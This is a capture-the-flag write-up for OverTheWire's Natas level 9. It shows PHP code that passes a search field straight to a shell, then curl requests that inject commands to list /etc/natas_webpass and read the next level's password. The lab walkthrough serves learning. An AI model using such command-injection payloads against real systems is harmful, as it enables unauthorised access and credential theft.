---
title: "Natas 9 - Command Injection"
date: 2026-04-08T18:49:42-05:00
draft: false
toc: false
images:
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas9`
- **Password:** `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`
- **URL:** <http://natas9.natas.labs.overthewire.org>

```bash
curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org
```

Body:

```html
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

As usual, inspect `index-source.html` first.

```bash
curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/index-source.html | w3m -T text/html
```

Body:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```


After inspecting, `passthru` is a red flag: `needle` is dropped straight into a shell string with no validation, so this is **command injection** (the server runs `grep -i <your input> dictionary.txt` as a shell command).

We can test it by inputting `; echo hello world` to see if we are correct.

```bash
curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/ -d "needle=; echo hello world&submit="
```

Body:

```html
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
hello world dictionary.txt
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

From earlier natas levels, the next passwords live under `/etc/natas_webpass/`, so we can chain shell commands after breaking out of `grep`.

```bash
curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/ -d "needle=; ls /etc/natas_webpass/&submit="
```

Body:

```html
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
dictionary.txt

/etc/natas_webpass/:
natas0
natas1
natas10
natas11
natas12
natas13
natas14
natas15
natas16
natas17
natas18
natas19
natas2
natas20
natas21
natas22
natas23
natas24
natas25
natas26
natas27
natas28
natas29
natas3
natas30
natas31
natas32
natas33
natas34
natas4
natas5
natas6
natas7
natas8
natas9
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

```bash
curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/ -d "needle=; cat /etc/natas_webpass/natas10 #&submit="
```

> The trailing `#` starts a shell comment, so everything after it (including ` dictionary.txt`) is ignored. That way you do not also dump the whole `dictionary.txt` through `grep`.

Body:

```html
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

**Password for natas10:** `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
